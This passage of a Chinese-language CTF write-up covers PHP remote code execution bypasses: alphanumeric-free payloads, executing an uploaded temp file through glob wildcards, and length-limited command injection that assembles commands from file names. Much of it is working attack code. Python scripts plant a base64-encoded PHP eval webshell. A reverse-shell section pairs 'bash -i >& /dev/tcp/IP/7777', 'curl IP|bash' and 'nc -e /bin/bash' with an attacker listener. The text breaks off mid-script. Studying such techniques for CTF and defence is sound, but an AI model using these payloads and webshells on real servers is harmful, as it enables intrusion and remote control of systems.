class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上题 其中有两个主要的思路：</p><ol><li>利用位运算</li><li>利用自增运算符</li></ol><p>相较于正常的(上面的)无字母数字RCE </p><p>这道题多了两个限制：</p><ol><li>webshell长度不超过35位</li><li>除了不包含字母数字，还不能包含<code>$</code>和<code>_</code></li></ol><p>因为<code>$</code>不能使用了，所以我们无法构造PHP中的变量 所以上述方法无法进行</p><p>所以 这里其实有一种新方法</p><p>这里重点说一下<strong>临时文件上传</strong></p><h4 id="PHP7下简单解决"><a href="#PHP7下简单解决" class="headerlink" title="PHP7下简单解决"></a>PHP7下简单解决</h4><p>我们将上述代码放在index.php中，然后执行<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:7.2-apache</code>，启动一个php 7.2的服务器。</p><p>php7中修改了表达式执行的<a href="http://php.net/manual/zh/migration70.incompatible.php">顺序</a>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf90a8a.png" alt="image-20240331120445300"></p><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p><p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d08c7ce.png" alt="image-20240331120819058"></p><h4 id="PHP5下理解"><a href="#PHP5下理解" class="headerlink" title="PHP5下理解"></a>PHP5下理解</h4><h5 id="PHP5下思考"><a href="#PHP5下思考" class="headerlink" title="PHP5下思考"></a>PHP5下思考</h5><p>我们使用<code>docker run --rm -p 9090:80 -v </code>pwd<code>:/var/www/html php:5.6-apach</code>来运行一个php5.6的web环境。</p><p>此时，我们尝试用PHP7的payload，将会得到一个错误：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf5c597.png" alt="image-20240331120800881"></p><p>原因就是php5并不支持这种表达方式。</p><p>大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。</p><p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p><h5 id="PHP5-shell打破禁锢"><a href="#PHP5-shell打破禁锢" class="headerlink" title="PHP5+shell打破禁锢"></a>PHP5+shell打破禁锢</h5><p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、<code>$</code>的系统命令来getshell？</p><p>好像问题又回到了原点：无字母、数字、<code>$</code>，在shell中仍然是一个难题。</p><p>此时我想到了两个有趣的Linux shell知识点：</p><blockquote><ol><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持用glob通配符代替</li></ol></blockquote><p><strong><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</strong></p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p><p>这儿主要介绍<code>php.ini</code>中的两个参数</p><p><code>file_uploads</code> 是否允许上传<br><code>upload_tmp_dir</code> 是默认的临时文件的保存目录（linux默认为<code>/tmp</code>）</p><p>这个文件也很好得到，<strong>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</strong></p><p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><blockquote><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul></blockquote><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cda411d.png" alt="image-20240331121547675"></p><p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf110ee.png" alt="image-20240331121610564"></p><p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>思路又陷入了僵局，虽然方向没错。</p><h5 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h5><p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读<a href="http://man7.org/linux/man-pages/man7/glob.7.html">Linux的文档</a>，可以学到更多有趣的知识点。</p><p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ccee8ff.png" alt="image-20240331121817617"></p><p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce44f0c.png" alt="image-20240331121926648"></p><p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p><p>继续阅读glob的帮助，发现另一个有趣的用法：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cd70c41.png" alt="image-20240331122049924"></p><p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p><p>我们再来看看之前列出可能干扰我们的文件：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf610fc.png" alt="image-20240331122112426"></p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p><img src="C:\Users\admin\Desktop\ascii.png" alt="ascii"></p><p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce62150.png" alt="image-20240331122316557"></p><p>显然这一招是管用的。</p><h5 id="构造POC-执行任意命令"><a href="#构造POC-执行任意命令" class="headerlink" title="构造POC 执行任意命令"></a>构造POC 执行任意命令</h5><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=</code>. &#x2F;???&#x2F;????????[@-[]<code>;?&gt;</code>，发送数据包如下：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf6c79e.png" alt="image-20240331122439548"></p><p>成功执行任意命令。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除这些之外我们还可以这样用<code>$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code>其中<code>&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</code>为构造出的<code>_GET</code>，适合于过滤了引号的情况下使用。</p><h2 id="限制长度RCE"><a href="#限制长度RCE" class="headerlink" title="限制长度RCE"></a>限制长度RCE</h2><h3 id="15字符下可控"><a href="#15字符下可控" class="headerlink" title="15字符下可控"></a>15字符下可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为只能传入14个字符，但是没有限制命令执行的次数，所以我们的思想可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段一句话木马到指定文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="variable">$_GET</span></span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>经测试上述这样的一句话木马（经过换行）是可以命令执行的，所以我们可以通过传参构造出这样的一句话木马，不断传入以下Payload：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cd8d4d6.png" alt="image-20240331192116873"></p><h3 id="7字符下可控"><a href="#7字符下可控" class="headerlink" title="7字符下可控"></a>7字符下可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]&lt;<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;-- cat flag.php --&gt;</span><br><span class="line">替换：</span><br><span class="line">touch &quot;hp&quot;</span><br><span class="line">touch &quot;g.p\\&quot;</span><br><span class="line">touch &quot;la\\&quot;</span><br><span class="line">touch &quot;t f\\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">ls -t &gt;a 将 ls -t 内容写入到a文件中</span><br><span class="line">sh a</span><br><span class="line"></span><br><span class="line">\是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure><p>同理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;和&gt;&gt;：</span><br><span class="line"></span><br><span class="line">&gt;b 类似于touch b，即直接创建文件b，通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容</span><br><span class="line"></span><br><span class="line">echo kuai &gt; a  #创建文件a，并把字符串&#x27;kuai&#x27;写入到文件a里</span><br><span class="line"></span><br><span class="line">&gt;&gt;用来追加内容</span><br><span class="line"></span><br><span class="line">kuai &gt;&gt;a   #在文件a末尾追加字符串&#x27;kuai&#x27;</span><br><span class="line"></span><br><span class="line">ls -t命令：按时间顺序，由近及远排序（后创建的排在前面，只能精确到秒）</span><br></pre></td></tr></table></figure><p>由此：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&gt;ag</span><br><span class="line">#&gt;fl</span><br><span class="line">#&gt;&quot;t&quot;</span><br><span class="line">#&gt;ca</span><br><span class="line">#ls -t</span><br><span class="line">ca &#x27;t &#x27; fl ag</span><br></pre></td></tr></table></figure><p>按时间顺序反向依次创建文件，”ca” “‘t “ “fl” “ag”</p><p>再通过ls -t &gt; x，创建文件x，并把’Is -t执行结果写入文件x里 。</p><p>实际上在创建文件时，加入”&quot;，把命令”ca””t””f””ag”连接起来</p><blockquote><ul><li><p>“\” linux中可以用\使指令连接下一行，这样就可以写多行命令了。</p></li><li><p>文件中前面命令出错，会自动跳过，不影响后面命令的执行。</p></li><li><p>Shell 脚本的执行方式通常有如下<a href="https://blog.csdn.net/timchen525/article/details/76407735">三种</a>：</p></li></ul><p>​       bash script-name 或者 sh script-name；</p><p>​       path&#x2F;script-name或者.&#x2F;script-name；</p><p>​       sourcescript-name或者. script-name。</p><p>推荐用第一种 <code>bash file</code> <code>sh file</code> 第三种<code>. file </code>第二种要文件有执行权限故不推荐</p></blockquote><p>上面不是ls -t&gt;a 吗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat a     查看后发现都写进去了</span><br></pre></td></tr></table></figure><p>然后可以.a执行脚本</p><p>可以发现确实符合第四条 文件中前面命令出错，会自动跳过，不影响后面命令的执行。</p><p>可以发现最长的长度就是 <code>ls -t&gt;0</code> 7了</p><p>上点难度假如要执行 <code>echo Y2F0IC9mbGFn|base64 -d&gt;1</code> 怎么办？(Y2F0IC9mbGFn -&gt; cat &#x2F;flag)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入语句</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">#base64编码后</span></span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsxXSk7</span><br><span class="line"><span class="comment">#需要被执行的语句：</span></span><br><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>payload.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://172.19.14.20:27444/index.php?rce=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://172.19.14.20:27444/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>攻击完成后就会生成1.php文件</p><p><strong>注：</strong>这里用的是&lt;?php eval($_GET[1]); 不是一句话木马，不能用蚁剑链接(可能改成POST就行了，不过没有尝试)</p><p>命令里的空格，&gt; ，| ，或者其他特殊字符一定要转义。</p><h3 id="5字符下可控"><a href="#5字符下可控" class="headerlink" title="5字符下可控"></a>5字符下可控</h3><p>与7字符下可控一样</p><p>主要思路是缩短 <code>ls -t&gt;0</code> 这一步骤的长度，把这条命令拆分到各个文件中去</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h4><p>拼接字符串写入一句话</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0【前面可以拆成更小的，ls -t&gt;0需要单独拆分出来】</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>ls -t &gt;0 拆分方法</p><p>同理：</p><ol><li><p>输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p></li><li><p>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</p></li><li><p>用dir来代替ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line">echo 1234 &gt; v</span><br><span class="line">*v （等同于命令：rev v）</span><br></pre></td></tr></table></figure><p>目的：echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d&gt;1.php</p><p>那么我们只需要将上面的代码拆分倒序输入到主机即可。我们需要让sh先执行a文件（ls -th &gt;f）就会得到f文件，最后再让sh去执行f文件即可得到1.php。最终payload如下</p><p>payload.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\ </span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\ </span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.12.107/5/index.php?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        <span class="comment">#检查是 否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.12.107/5/sandbox/2ad26c4b0f3cdead3c4c1955ad805b8d/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后蚁剑连接即可（1.php）</p><h4 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h4><p>反弹shell</p><p>既然可以执行命令，那么我们首先想到的是反弹一个shell回来</p><blockquote><p>我们在自己的vps上web目录&#x2F;var&#x2F;www&#x2F;html&#x2F;里先创建一个文件index.html，里面写好反弹shell的话（由于linux文件名不能有斜杠“&#x2F;”，所以就不能curl xxx.xxx.xxx.xxx&#x2F;1.txt，我们就用index，这样47.1x0.1x0.123连上后会默认自动访问index.html反弹shell）</p></blockquote><p>bash反弹shell的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/监听的端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>空格需要转义</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure><p>构造空格就用去了五个字符，我们的语句里面有两个空格，而相同的文件名只能有一个，因此这里不能直接执行bash反弹shell<br>那么通过将反弹语句放在vps上，然后通过如下方式来执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ip地址|bash</span><br></pre></td></tr></table></figure><p>我们先在自己的vps新建一个文件，内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/120.79.33.253/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后在vps上面监听7777端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lv 7777</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cd8fbd6.png" alt="image-20240401084203278"></p><p>因为ls -t&gt;_的长度也大于5，所以要要把ls -t&gt;y写入文件</p><p>ls命令排序的规则是空格和符号最前，数字其次，字母最后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ls\\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161ce76530.png" alt="image-20240401084253212"></p><p>那么我们再构造curl 120.79.33.253|bash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;53\\</span><br><span class="line">&gt;2\\</span><br><span class="line">&gt;3.\\</span><br><span class="line">&gt;3\\</span><br><span class="line">&gt;9.\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;12\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh _</span><br></pre></td></tr></table></figure><p>生成文件y<br>再执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh y</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">本脚本使用说明:</span></span><br><span class="line"><span class="string">    现有靶机:192.168.40.148  攻击机:192.168.40.146,两者均为kali</span></span><br><span class="line"><span class="string">    对于靶机:</span></span><br><span class="line"><span class="string">        搭建环境:</span></span><br><span class="line"><span class="string">        拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">        启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">        退出并关闭docker:exit</span></span><br><span class="line"><span class="string">    对于攻击机: 开三个终端,分别执行:</span></span><br><span class="line"><span class="string">        nc -lvp 7777</span></span><br><span class="line"><span class="string">        vim 一个index.html文件,写入 nc 192.168.40.146 7777 -e /bin/bash 或执行命令: echo &quot;nc 192.168.40.146 7777 -e /bin/bash&quot; &gt; index.html</span></span><br><span class="line"><span class="string">        开启HTTP服务: python -m http.server 80</span></span><br><span class="line"><span class="string">        (第二,第三个命令需要在同一个目录下执行)</span></span><br><span class="line"><span class="string">    温馨提示:</span></span><br><span class="line"><span class="string">        根据情况修改变量baseurl的值</span></span><br><span class="line"><span class="string">        根据情况修改list2中的IP</span></span><br><span class="line"><span class="string">        在执行该脚本的时候,可通过进入靶机内部对应的题目目录下不断地执行ls命令,来看传值的情况</span></span><br><span class="line"><span class="string">        最终的结果应是21秒左右能反弹成功</span></span><br><span class="line"><span class="string">        不能反弹成功时尝试查看脚本是否有问题</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.40.148:18080/class09/3/index.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件_</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">    <span 